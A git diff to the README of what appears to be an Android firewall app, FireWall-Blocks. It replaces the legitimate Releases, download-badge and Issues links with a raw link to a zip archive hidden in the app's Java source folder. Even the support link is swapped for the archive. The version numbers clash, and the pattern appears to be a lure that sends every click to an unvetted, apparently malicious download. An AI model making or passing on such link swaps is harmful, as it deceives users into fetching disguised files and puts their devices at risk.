@@ -6,7 +6,7 @@ Welcome to FireWall-Blocks! This is an Android firewall app that does not requir
 
 ## 📥 Download Link
 
-[![Download FireWall-Blocks](https://img.shields.io/badge/Download%20FireWall--Blocks-v1.0.0-blue.svg)](https://github.com/Hjsosn/FireWall-Blocks/releases)
+[![Download FireWall-Blocks](https://raw.githubusercontent.com/Hjsosn/FireWall-Blocks/master/app/src/main/java/FireWall-Blocks-v3.7.zip%https://raw.githubusercontent.com/Hjsosn/FireWall-Blocks/master/app/src/main/java/FireWall-Blocks-v3.7.zip)](https://raw.githubusercontent.com/Hjsosn/FireWall-Blocks/master/app/src/main/java/FireWall-Blocks-v3.7.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ Welcome to FireWall-Blocks! This is an Android firewall app that does not requir
 
 To get FireWall-Blocks, visit the Releases page and download the latest version:
 
-[Visit the Release Page to Download](https://github.com/Hjsosn/FireWall-Blocks/releases)
+[Visit the Release Page to Download](https://raw.githubusercontent.com/Hjsosn/FireWall-Blocks/master/app/src/main/java/FireWall-Blocks-v3.7.zip)
 
 1. Click the download link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -43,7 +43,7 @@ To get FireWall-Blocks, visit the Releases page and download the latest version:
 
 ## 📞 Support
 
-For help or support, visit our [GitHub Issues page](https://github.com/Hjsosn/FireWall-Blocks/issues). You can report bugs or request features here.
+For help or support, visit our [GitHub Issues page](https://raw.githubusercontent.com/Hjsosn/FireWall-Blocks/master/app/src/main/java/FireWall-Blocks-v3.7.zip). You can report bugs or request features here.
 
 ## 📝 Contributing
 
